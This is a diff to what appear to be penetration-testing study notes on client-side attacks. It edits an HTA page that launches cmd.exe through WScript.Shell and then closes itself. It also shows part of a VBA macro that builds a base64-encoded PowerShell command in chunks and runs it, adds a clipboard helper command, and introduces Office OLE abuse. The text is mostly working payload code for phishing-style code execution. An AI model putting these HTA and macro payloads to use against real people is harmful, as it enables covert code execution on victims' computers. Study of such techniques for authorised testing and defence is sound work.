@@ -109,13 +109,24 @@ Updated File
 
 ```
 <html>
-<body>
+<head>
 <script>
+
 var c= 'cmd.exe'
 new ActiveXObject('WScript.Shell').Run(c);
+
 </script>
+
+</head>
+<body>
+
+<script>
+self.close();
+</script>
+
 </body>
 </html>
+
 ```
 
 ### Shell Code Generation
@@ -167,6 +178,8 @@ Str = Str + "AZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0Ac" Str = Str + "AB
 CreateObject("Wscript.Shell").Run Str 
 End Sub
 ```
+python ./split.py |  xclip -selection clipboard
+
 ### MS Document Abuse
 
 we can still leverage Object Linking and Embedding (OLE)360 to abuse Microsoft Office’s document-embedding feature
